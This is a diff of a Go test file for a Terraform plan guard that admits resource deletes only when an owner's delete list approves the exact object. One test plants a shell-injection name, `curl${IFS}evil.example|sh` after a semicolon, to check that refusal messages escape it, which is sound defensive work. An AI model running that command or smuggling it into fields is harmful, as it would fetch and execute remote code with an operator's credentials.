@@ -2,6 +2,7 @@ package tf
 
 import (
 	"encoding/json"
+	"os"
 	"slices"
 	"strings"
 	"testing"
@@ -40,7 +41,15 @@ func mrc(typ string, after map[string]any) ResourceChange {
 // every fixture of the resource rules shares (managed_apply_test.go holds the
 // configuration's own).
 func managedPlan(changes ...ResourceChange) *Plan {
-	return &Plan{FormatVersion: "1.2", ResourceChanges: changes, Configuration: &Configuration{
+	// Every before view is the one terraform's state writes, the per-instance
+	// attribute of its type included (withInstance), so a fixture cannot
+	// remove an object the rule cannot identify and read the refusal that
+	// follows as the rule it meant to test.
+	views := make([]ResourceChange, len(changes))
+	for i, rc := range changes {
+		views[i] = withInstance(rc)
+	}
+	return &Plan{FormatVersion: "1.2", ResourceChanges: views, Configuration: &Configuration{
 		ProviderConfig: map[string]ProviderConfig{"google": {Name: "google", FullName: "registry.terraform.io/hashicorp/google",
 			Expressions: map[string]json.RawMessage{"project": json.RawMessage(`{"constant_value":"proj-1"}`)}}}}}
 }
@@ -66,7 +75,7 @@ const managedAccount = ManagedPrefix + "run@proj-1.iam.gserviceaccount.com"
 const managedServiceIngress = "INGRESS_TRAFFIC_INTERNAL_LOAD_BALANCER"
 
 // TestManagedAllowedTypesGolden pins both halves of the decision against
-// literals: the 15 types a managed plan may contain, and the 12 entries of
+// literals: the 15 types a managed plan may contain, and the 16 entries of
 // allowedTypes it may not. A widening — or a type dropped without a reason —
 // is a diff in this test.
 func TestManagedAllowedTypesGolden(t *testing.T) {
@@ -92,6 +101,10 @@ func TestManagedAllowedTypesGolden(t *testing.T) {
 	}
 	wantDropped := []string{
 		"google_billing_budget",
+		// A grant on the credentials service (C1.18): the deployer holds no
+		// run.services.setIamPolicy. The service type itself is admitted above
+		// (central-orchestrator P1, D19), held to the prefix.
+		"google_cloud_run_v2_service_iam_member",
 		// main's compute module's network (the compute backend, excluded from
 		// 0.9.0), dropped on the merge of main into next-0.8.5 as the
 		// fail-closed default.
@@ -150,6 +163,53 @@ func TestManagedAllowedTypesIsDecided(t *testing.T) {
 	if got := ManagedAllowedTypes(); !slices.IsSorted(got) || len(got) != len(managedTypes) {
 		t.Errorf("ManagedAllowedTypes is %v: not the list's own keys", got)
 	}
+}
+
+// TestManagedCoverCommentsCountTheDroppedTypes: both comments in
+// managed_cover.go that say how many entries managedDropped has read "twelve"
+// while the map grew to seventeen, and nothing noticed — a count in prose is a
+// second copy of a fact the map already holds, and the map is the copy that
+// cannot be wrong. This reads the two sentences and the map against each
+// other.
+//
+// Mutation (put "twelve" back in either sentence, or add an entry to
+// managedDropped without touching them): this fails.
+func TestManagedCoverCommentsCountTheDroppedTypes(t *testing.T) {
+	src, err := os.ReadFile("managed_cover.go")
+	if err != nil {
+		t.Fatal(err)
+	}
+	word, ok := droppedCountWord(len(managedDropped))
+	if !ok {
+		t.Skipf("managedDropped has %d entries, more than this check spells in words; enlarge droppedCountWord", len(managedDropped))
+	}
+	// Flattened with the comment markers dropped, because the file wraps both
+	// sentences: the number and the words after it are on different lines.
+	flat := strings.Join(strings.Fields(strings.ReplaceAll(string(src), "//", " ")), " ")
+	for _, tail := range []string{"entries in managedDropped", "entries of managedDropped"} {
+		at := strings.Index(flat, tail)
+		if at < 0 {
+			t.Errorf("managed_cover.go no longer says %q: this test's marker has moved", tail)
+			continue
+		}
+		before := strings.Fields(flat[:at])
+		if got := before[len(before)-1]; got != word {
+			t.Errorf("managed_cover.go says %q before %q, and managedDropped has %d entries (%s): the count in the comment is a second copy of what the map holds", got, tail, len(managedDropped), word)
+		}
+	}
+}
+
+// droppedCountWord spells a small count the way managed_cover.go's comments do,
+// so the comparison is against the sentence rather than against a digit the
+// file never prints.
+func droppedCountWord(n int) (string, bool) {
+	words := []string{"zero", "one", "two", "three", "four", "five", "six", "seven",
+		"eight", "nine", "ten", "eleven", "twelve", "thirteen", "fourteen", "fifteen",
+		"sixteen", "seventeen", "eighteen", "nineteen", "twenty"}
+	if n < 0 || n >= len(words) {
+		return "", false
+	}
+	return words[n], true
 }
 
 // managedKeptFixture is one resource per type the list keeps: the type's own
@@ -1689,16 +1749,72 @@ func TestManagedCoverDropsInitAttributeChecks(t *testing.T) {
 // create is. The address alone never admits one, and the list alone neither:
 // the two are separate rules and a fixture fails each on its own.
 
+// withInstance is rc with the per-instance attribute its type carries filled
+// into its before view when the fixture did not write one
+// (removalInstanceAttributes, read here as the rule reads it). A state
+// terraform wrote always carries it — the provider computes it when the object
+// is created — and a removal whose view lacks it identifies nothing and is
+// refused (tf.Approves), so a fixture that meant "the plan removes this
+// object" and left it out would be reading that refusal instead of the rule it
+// is about. The value is the fixture's own and is derived from the address, so
+// two fixtures of one type are two instances and one fixture is always the
+// same instance. A type that carries none, and a change with no before view at
+// all (a create), come back unchanged.
+func withInstance(rc ResourceChange) ResourceChange {
+	attr := removalInstanceAttributes[rc.Type]
+	if attr == "" || rc.Change.Before == nil {
+		return rc
+	}
+	if v, ok := rc.Change.Before[attr]; ok && v != nil {
+		return rc
+	}
+	before := make(map[string]any, len(rc.Change.Before)+1)
+	for k, v := range rc.Change.Before {
+		before[k] = v
+	}
+	if attr == "generation" {
+		// A bucket object's generation is a number in terraform's JSON
+		// (tf.instanceValue), and a fixture that wrote a string there would
+		// not be the shape the plan has.
+		before[attr] = float64(1758000000000000)
+	} else {
+		before[attr] = "fixture-instance:" + rc.Address
+	}
+	rc.Change.Before = before
+	return rc
+}
+
 // destroyed is the change terraform writes for a resource it destroys: the
 // resource in before, null in after, and no after_unknown. It is what the
 // removed half of a delete or a replace is read from.
+//
+// The view carries an id, because terraform's state does: every resource of
+// Google's provider has one, and it is what the owner's delete list binds an
+// approval to (Task 6.3). The fixtures above are written without one — no
+// other rule reads it — so it is added here, on a copy, and never on the
+// fixture's own map, which every test in this file shares.
 func destroyed(rc ResourceChange) ResourceChange {
+	before := make(map[string]any, len(rc.Change.After)+1)
+	for k, v := range rc.Change.After {
+		before[k] = v
+	}
 	rc.Change.Actions = []string{"delete"}
-	rc.Change.Before = rc.Change.After
+	rc.Change.Before = before
+	if _, ok := before["id"]; !ok {
+		before["id"] = "id:" + rc.Address
+	}
 	rc.Change.After = nil
 	rc.Change.AfterUnknown = nil
-	return rc
+	return withInstance(rc)
 }
+
+// approving is the owner's delete list holding the entry that approves rc's
+// own removal — the address and the identity the plan shows there (ApprovalFor)
+// — which is what an approval is since Task 6.3. A test that means "the owner
+// approved this removal" writes this and not a bare address: the address alone
+// approves nothing any more, and a test written with one would pass over a rule
+// it no longer exercises.
+func approving(rc ResourceChange) []DeleteEntry { return []DeleteEntry{ApprovalFor(withInstance(rc))} }
 
 // TestManagedCoverAdmitsAListedDeleteOfAnAllowedResource: a delete of an exact
 // address on the owner's list whose resource the allowlist admits is admitted.
@@ -1708,7 +1824,7 @@ func TestManagedCoverAdmitsAListedDeleteOfAnAllowedResource(t *testing.T) {
 	for _, typ := range ManagedAllowedTypes() {
 		t.Run(typ, func(t *testing.T) {
 			rc := destroyed(managedKeptFixture[typ])
-			c := managedTestCover().WithDeleteList([]string{rc.Address})
+			c := managedTestCover().WithDeleteEntries(approving(rc))
 			if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
 				t.Fatalf("a listed delete of the %s fixture is not covered: %q", typ, out)
 			}
@@ -1734,7 +1850,7 @@ func TestManagedCoverRefusesAListedDeleteOfATypeOutsideTheAllowlist(t *testing.T
 	} {
 		t.Run(tc.typ, func(t *testing.T) {
 			rc := destroyed(mrc(tc.typ, map[string]any{"name": ManagedPrefix + "x"}))
-			c := managedTestCover().WithDeleteList([]string{rc.Address})
+			c := managedTestCover().WithDeleteEntries(approving(rc))
 			out := c.NotCovered(managedPlan(rc), nil)
 			if len(out) != 1 || !strings.HasPrefix(out[0], rc.Address+" (") {
 				t.Fatalf("a listed delete of %s gives %q, want one refusal at its own address", tc.typ, out)
@@ -1759,7 +1875,7 @@ func TestManagedCoverRefusesAnActionSetTerraformDoesNotWrite(t *testing.T) {
 		t.Run(strings.Join(acts, ","), func(t *testing.T) {
 			rc := managedKeptFixture["google_storage_bucket"]
 			rc.Change.Actions = acts
-			c := managedTestCover().WithDeleteList([]string{rc.Address})
+			c := managedTestCover().WithDeleteEntries(approving(rc))
 			out := c.NotCovered(managedPlan(rc), nil)
 			if len(out) != 1 || !strings.Contains(out[0], "actions "+strings.Join(acts, ", ")) {
 				t.Fatalf("the action set %v of a listed address gives %q, want the actions rule", acts, out)
@@ -1798,7 +1914,7 @@ func TestManagedCoverJudgesTheRemovedViewFromBefore(t *testing.T) {
 	rc.Change.AfterUnknown = map[string]any{"name": true,
 		"retention_policy": []any{map[string]any{"is_locked": true}}}
 	rc.Change.Importing = &Importing{ID: "fugaro-tfstate-proj-1"}
-	c := managedTestCover().WithDeleteList([]string{rc.Address})
+	c := managedTestCover().WithDeleteEntries(approving(rc))
 	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
 		t.Fatalf("a listed destroy of a prefixed bucket gives %q, want it covered: the removed view is before and nothing of the after", out)
 	}
@@ -1808,16 +1924,16 @@ func TestManagedCoverJudgesTheRemovedViewFromBefore(t *testing.T) {
 // name rule — an allowed type whose removed resource is not the plan's own.
 func TestManagedCoverRefusesAListedDeleteOutsideTheManagedPrefix(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
-	rc.Change.Before = map[string]any{"name": "fugaro-runs-proj-1"}
-	c := managedTestCover().WithDeleteList([]string{rc.Address})
-	out := c.NotCovered(managedPlan(rc), nil)
+	rc.Change.Before = map[string]any{"name": "fugaro-runs-proj-1", "id": "fugaro-runs-proj-1"}
+	out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil)
 	if len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
 		t.Fatalf("a listed delete of a bucket outside the prefix gives %q, want the prefix rule", out)
 	}
 	// The same resource with the name it may carry: the fixture above fails on
-	// the name and on nothing else.
-	rc.Change.Before = map[string]any{"name": ManagedPrefix + "bucket"}
-	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
+	// the name and on nothing else, and the entry is the owner's for the view
+	// the plan then shows.
+	rc.Change.Before = map[string]any{"name": ManagedPrefix + "bucket", "id": "fmgd-bucket"}
+	if out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil); len(out) != 0 {
 		t.Fatalf("the same delete with a prefixed name gives %q, want it covered", out)
 	}
 }
@@ -1828,9 +1944,10 @@ func TestManagedCoverRefusesAListedDeleteOutsideTheManagedPrefix(t *testing.T) {
 func TestManagedCoverRefusesAListedDeleteOfAnAccountOutsideTheManagedProject(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_service_account_iam_member"])
 	rc.Change.Before = map[string]any{
+		"id":                 "projects/proj-1/serviceAccounts/123456789-compute@developer.gserviceaccount.com/roles/iam.serviceAccountUser",
 		"service_account_id": "projects/proj-1/serviceAccounts/123456789-compute@developer.gserviceaccount.com",
 		"member":             "serviceAccount:" + managedAccount, "role": "roles/iam.serviceAccountUser"}
-	c := managedTestCover().WithDeleteList([]string{rc.Address})
+	c := managedTestCover().WithDeleteEntries(approving(rc))
 	out := c.NotCovered(managedPlan(rc), nil)
 	if len(out) != 1 || !strings.Contains(out[0], "not a service account of the managed project") {
 		t.Fatalf("a listed delete of a grant on the default compute account gives %q, want the account rule", out)
@@ -1857,11 +1974,49 @@ func TestManagedCoverRefusesAListedDeleteOfALockedResource(t *testing.T) {
 		{b, "a bucket whose retention policy is locked"},
 		{o, "an object whose retention mode is Locked"},
 	} {
-		c := managedTestCover().WithDeleteList([]string{tc.rc.Address})
+		c := managedTestCover().WithDeleteEntries(approving(tc.rc))
 		out := c.NotCovered(managedPlan(tc.rc), nil)
 		if len(out) != 1 || !strings.Contains(out[0], tc.want) {
 			t.Fatalf("a listed delete of a locked %s gives %q, want %q", tc.rc.Type, out, tc.want)
 		}
+	}
+}
+
+// TestManagedCoverRefusalOfAShellCommandNameIsPasteable: the refusal an
+// unlisted removal draws prints the identity of the object the plan removes,
+// for its reader to copy into fugaro allow-delete — and the object's own name
+// is the plan's, not this program's. The name rule (managedName) does not
+// reach this one: for a bucket object the attribute managedNames names is the
+// BUCKET, so the object's own name is read out of the before view as it
+// stands. A plan carrying "fmgd-x;curl${IFS}evil.example|sh" there is a plan
+// whose refusal would otherwise hand its reader a command line to paste, with
+// the operator's credentials, so this pins the end the identity's escaping is
+// for: the sentence holds no byte a shell reads (tf.identityValue,
+// TestAnIdentityHoldsNoByteAShellWouldRead for the encoder itself).
+func TestManagedCoverRefusalOfAShellCommandNameIsPasteable(t *testing.T) {
+	rc := destroyed(managedKeptFixture["google_storage_bucket_object"])
+	rc.Change.Before = map[string]any{
+		"bucket": ManagedPrefix + "bucket", "name": `fmgd-x;curl${IFS}evil.example|sh`,
+		"id": ManagedPrefix + "bucket/x", "project": "proj-1", "generation": float64(1758000000000000)}
+	out := managedTestCover().NotCovered(managedPlan(rc), nil)
+	if len(out) != 1 {
+		t.Fatalf("an unlisted delete of a bucket object gives %q, want one refusal", out)
+	}
+	// The identity the sentence prints, copied the way its reader copies it:
+	// what follows the sentence's own words, up to the bracket that closes its
+	// parenthetical. The sentence's own text is not part of it — it is this
+	// program's, and it holds an apostrophe of its own.
+	const mark = "(the plan removes "
+	i := strings.Index(out[0], mark)
+	if i < 0 {
+		t.Fatalf("the refusal does not name the object the plan removes:\n%s", out[0])
+	}
+	printed := strings.TrimSuffix(out[0][i+len(mark):], ")")
+	if strings.ContainsAny(printed, ";|&$`{}[]*?!~'\"") {
+		t.Errorf("the refusal prints the plan's own name raw, so a reader pasting it runs a command:\n%s", printed)
+	}
+	if !strings.Contains(printed, `fmgd-x\x3bcurl\x24\x7bIFS\x7devil.example\x7csh`) {
+		t.Errorf("the refusal does not carry the name as the identity escapes it:\n%s", printed)
 	}
 }
 
@@ -1879,25 +2034,78 @@ func TestManagedCoverReplacesAreJudgedLikeDeletes(t *testing.T) {
 				rc.Change.Before, rc.Change.After = before, after
 				return rc
 			}
-			listed := managedTestCover().WithDeleteList([]string{"module.managed.google_storage_bucket.this"})
 			prefixed, fugaro := map[string]any{"name": ManagedPrefix + "bucket"}, map[string]any{"name": "fugaro-tfstate-proj-1"}
-			if out := listed.NotCovered(managedPlan(replacing(prefixed, prefixed)), nil); len(out) != 0 {
+			// The owner's entry is for the object the change removes, which is
+			// the one in before (Task 6.3): each case below is handed the entry
+			// for its own removal, so what refuses it is the resource rule the
+			// case is about and never the list.
+			listed := func(rc ResourceChange) Deletable {
+				return managedTestCover().WithDeleteEntries(approving(rc))
+			}
+			if out := listed(replacing(prefixed, prefixed)).NotCovered(managedPlan(replacing(prefixed, prefixed)), nil); len(out) != 0 {
 				t.Fatalf("a listed replace of two allowed resources gives %q, want it covered", out)
 			}
-			if out := listed.NotCovered(managedPlan(replacing(fugaro, prefixed)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
+			if out := listed(replacing(fugaro, prefixed)).NotCovered(managedPlan(replacing(fugaro, prefixed)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
 				t.Fatalf("a listed replace whose removed resource is not the plan's gives %q, want the prefix rule", out)
 			}
-			if out := listed.NotCovered(managedPlan(replacing(prefixed, fugaro)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
+			if out := listed(replacing(prefixed, fugaro)).NotCovered(managedPlan(replacing(prefixed, fugaro)), nil); len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
 				t.Fatalf("a listed replace whose created resource is not the plan's gives %q, want the prefix rule", out)
 			}
 			// The unlisted replace, whose resources are both the plan's own:
 			// the list is the whole of the refusal, and the resource rules
-			// have nothing to say about it.
-			if out := managedTestCover().NotCovered(managedPlan(replacing(prefixed, prefixed)), nil); len(out) != 1 ||
-				!strings.Contains(out[0], "not on the owner's delete list") {
+			// have nothing to say about it. The refusal prints the identity of
+			// the object the plan removes beside the address, because that is
+			// what an entry of the owner's list has to name and the address
+			// alone stopped being an entry (Task 6.3): an owner sent to record
+			// the address would write a list that approves nothing. The
+			// identity is read back from RemoveIdentityText, the rule's own
+			// answer, rather than spelled out here.
+			unlisted := managedPlan(replacing(prefixed, prefixed))
+			out := managedTestCover().NotCovered(unlisted, nil)
+			if len(out) != 1 || !strings.Contains(out[0], "not on the owner's delete list") {
 				t.Fatalf("an unlisted replace of two allowed resources gives %q, want the delete-list rule", out)
 			}
+			if id := RemoveIdentityText(unlisted.ResourceChanges[0]); !strings.Contains(out[0], id) {
+				t.Errorf("the refusal is %q, want the identity the owner's entry must carry named in it (%s)", out[0], id)
+			}
 		})
+	}
+}
+
+// TestManagedCoverBindsAListedAddressToTheObjectItApproved: the entry of the
+// owner's list carries the identity of the object that was at the address when
+// the owner approved it (Task 6.3), and the cover admits a removal only when
+// the plan removes that object. A second delete at the same address — the
+// object re-created, so another id — is refused, which is the reuse the
+// address-only list allowed: the entry stands for one object, and the approval
+// it carries is spent when that object is gone.
+func TestManagedCoverBindsAListedAddressToTheObjectItApproved(t *testing.T) {
+	approved := destroyed(managedKeptFixture["google_storage_bucket"])
+	recreated := approved
+	recreated.Change.Before = map[string]any{"name": ManagedPrefix + "bucket", "id": "fmgd-bucket-2"}
+
+	if out := managedTestCover().WithDeleteEntries(approving(approved)).NotCovered(managedPlan(approved), nil); len(out) != 0 {
+		t.Fatalf("a delete of the object the entry names gives %q, want it covered", out)
+	}
+	out := managedTestCover().WithDeleteEntries(approving(approved)).NotCovered(managedPlan(recreated), nil)
+	if len(out) != 1 || !strings.Contains(out[0], "for another object") {
+		t.Fatalf("a listed address carrying another object gives %q, want it refused for the object", out)
+	}
+	if !strings.Contains(out[0], "fmgd-bucket-2") {
+		t.Errorf("the refusal is %q, want the object the plan removes named in it: it is what the owner re-approves", out[0])
+	}
+	// And the entry for the object the plan removes admits it: the rule
+	// refuses the reuse and not the delete.
+	if out := managedTestCover().WithDeleteEntries(approving(recreated)).NotCovered(managedPlan(recreated), nil); len(out) != 0 {
+		t.Fatalf("an entry bound to the object the plan removes gives %q, want it covered", out)
+	}
+	// A plan whose before view identifies nothing is refused whatever the list
+	// holds: there is nothing to match an entry against.
+	anonymous := approved
+	anonymous.Change.Before = map[string]any{"location": "us-east5"}
+	c := managedTestCover().WithDeleteEntries([]DeleteEntry{{Address: anonymous.Address, Before: "type=google_storage_bucket"}})
+	if out := c.NotCovered(managedPlan(anonymous), nil); len(out) != 1 || !strings.Contains(out[0], "does not identify") {
+		t.Fatalf("a removal the plan does not identify gives %q, want it refused for the missing identity", out)
 	}
 }
 
@@ -1907,17 +2115,22 @@ func TestManagedCoverReplacesAreJudgedLikeDeletes(t *testing.T) {
 func TestManagedCoverDeleteListIsExactAddresses(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
 	rc.Address = "module.managed.google_storage_bucket.x[1]"
+	// The entry's identity is the one the plan shows, so nothing below is
+	// refused for the identity: what each of these is about is the address.
+	entry := ApprovalFor(rc)
 	for _, listed := range []string{
 		"module.managed.google_storage_bucket.x[0]",
 		"module.managed.google_storage_bucket",
 		"module.managed.google_storage_bucket.x*",
 		"module.managed.google_storage_bucket.x",
 	} {
-		if out := managedTestCover().WithDeleteList([]string{listed}).NotCovered(managedPlan(rc), nil); len(out) != 1 {
+		near := entry
+		near.Address = listed
+		if out := managedTestCover().WithDeleteEntries([]DeleteEntry{near}).NotCovered(managedPlan(rc), nil); len(out) != 1 {
 			t.Errorf("%q listed admits x[1] (%q), want a refusal: an address matches by string equality alone", listed, out)
 		}
 	}
-	if out := managedTestCover().WithDeleteList([]string{rc.Address}).NotCovered(managedPlan(rc), nil); len(out) != 0 {
+	if out := managedTestCover().WithDeleteEntries(approving(rc)).NotCovered(managedPlan(rc), nil); len(out) != 0 {
 		t.Fatalf("the exact address listed gives %q, want it covered: the fixture above fails on the address alone", out)
 	}
 }
@@ -1927,8 +2140,8 @@ func TestManagedCoverDeleteListIsExactAddresses(t *testing.T) {
 // resource is.
 func TestManagedCoverDeleteListEmptyAdmitsNoDelete(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
-	for _, allow := range [][]string{nil, {}} {
-		if out := managedTestCover().WithDeleteList(allow).NotCovered(managedPlan(rc), nil); len(out) != 1 {
+	for _, allow := range [][]DeleteEntry{nil, {}} {
+		if out := managedTestCover().WithDeleteEntries(allow).NotCovered(managedPlan(rc), nil); len(out) != 1 {
 			t.Errorf("a delete with the list %v gives %q, want one refusal", allow, out)
 		}
 	}
@@ -1938,10 +2151,10 @@ func TestManagedCoverDeleteListEmptyAdmitsNoDelete(t *testing.T) {
 // owner's list, so the list the guard is handed and the list the cover reads
 // cannot drift apart through either of them.
 func TestManagedCoverDeleteListIsCopied(t *testing.T) {
-	allow := []string{"module.managed.google_storage_bucket.this"}
-	c := managedTestCover().WithDeleteList(allow)
-	allow[0] = "module.managed.google_storage_bucket.other"
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
+	allow := approving(rc)
+	c := managedTestCover().WithDeleteEntries(allow)
+	allow[0] = ApprovalFor(destroyed(managedKeptFixture["google_apikeys_key"]))
 	if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
 		t.Fatalf("a delete of the address the cover was handed gives %q, want it covered: the list was not copied", out)
 	}
@@ -1953,12 +2166,13 @@ func TestManagedCoverDeleteListIsCopied(t *testing.T) {
 func TestManagedCoverIsDeletable(t *testing.T) {
 	var _ Deletable = ManagedCover{}
 	var _ Deletable = managedTestCover()
-	d := managedTestCover().WithDeleteList([]string{"x"})
-	if !slices.Equal(d.(ManagedCover).AllowDelete, []string{"x"}) {
-		t.Error("WithDeleteList did not hand the cover the list it was given")
+	entries := []DeleteEntry{{Address: "x", Before: "type=t id=i"}}
+	d := managedTestCover().WithDeleteEntries(entries)
+	if !slices.Equal(d.(ManagedCover).AllowDelete, entries) {
+		t.Error("WithDeleteEntries did not hand the cover the list it was given")
 	}
 	if !slices.Equal(d.(ManagedCover).Projects, managedTestCover().Projects) {
-		t.Error("WithDeleteList changed the cover's own inputs: it is the cover with a list added, and nothing else")
+		t.Error("WithDeleteEntries changed the cover's own inputs: it is the cover with a list added, and nothing else")
 	}
 }
 
@@ -1996,7 +2210,7 @@ func TestManagedCoverRefusesAMovedDeleteUnderAListedAddress(t *testing.T) {
 		t.Run(name, func(t *testing.T) {
 			rc := moved
 			mut(&rc)
-			c := managedTestCover().WithDeleteList([]string{rc.Address})
+			c := managedTestCover().WithDeleteEntries(approving(rc))
 			out := c.NotCovered(managedPlan(rc), nil)
 			if len(out) != 1 || !strings.Contains(out[0], "moved here from") {
 				t.Fatalf("a moved removal under a listed address gives %q, want it refused for the move", out)
@@ -2007,7 +2221,7 @@ func TestManagedCoverRefusesAMovedDeleteUnderAListedAddress(t *testing.T) {
 	// no move reason — is admitted, so the refusals above are the move's.
 	own := moved
 	own.PreviousAddress, own.ActionReason = "", ""
-	if out := managedTestCover().WithDeleteList([]string{own.Address}).NotCovered(managedPlan(own), nil); len(out) != 0 {
+	if out := managedTestCover().WithDeleteEntries(approving(own)).NotCovered(managedPlan(own), nil); len(out) != 0 {
 		t.Fatalf("the same delete without the move gives %q, want it covered", out)
 	}
 }
@@ -2035,7 +2249,7 @@ func TestManagedCoverAdmitsTheListedAddressOwnRemovals(t *testing.T) {
 		t.Run(name, func(t *testing.T) {
 			rc := destroyed(managedKeptFixture["google_storage_bucket"])
 			mut(&rc)
-			c := managedTestCover().WithDeleteList([]string{rc.Address})
+			c := managedTestCover().WithDeleteEntries(approving(rc))
 			if out := c.NotCovered(managedPlan(rc), nil); len(out) != 0 {
 				t.Fatalf("a listed removal of the address's own object gives %q, want it covered", out)
 			}
@@ -2051,7 +2265,7 @@ func TestManagedCoverJudgesADeposedObjectOnItsOwnBefore(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
 	rc.Deposed = "00000001"
 	rc.Change.Before = map[string]any{"name": "fugaro-runs-proj-1"}
-	c := managedTestCover().WithDeleteList([]string{rc.Address})
+	c := managedTestCover().WithDeleteEntries(approving(rc))
 	out := c.NotCovered(managedPlan(rc), nil)
 	if len(out) != 1 || !strings.Contains(out[0], "outside the managed prefix") {
 		t.Fatalf("a listed deposed delete of a bucket outside the prefix gives %q, want the prefix rule", out)
@@ -2064,7 +2278,7 @@ func TestManagedCoverJudgesADeposedObjectOnItsOwnBefore(t *testing.T) {
 func TestManagedCoverRefusesAnUnknownRemovalReason(t *testing.T) {
 	rc := destroyed(managedKeptFixture["google_storage_bucket"])
 	rc.ActionReason = "delete_because_something_new"
-	c := managedTestCover().WithDeleteList([]string{rc.Address})
+	c := managedTestCover().WithDeleteEntries(approving(rc))
 	out := c.NotCovered(managedPlan(rc), nil)
 	if len(out) != 1 || !strings.Contains(out[0], "action_reason delete_because_something_new") {
 		t.Fatalf("an unknown removal reason gives %q, want it refused", out)
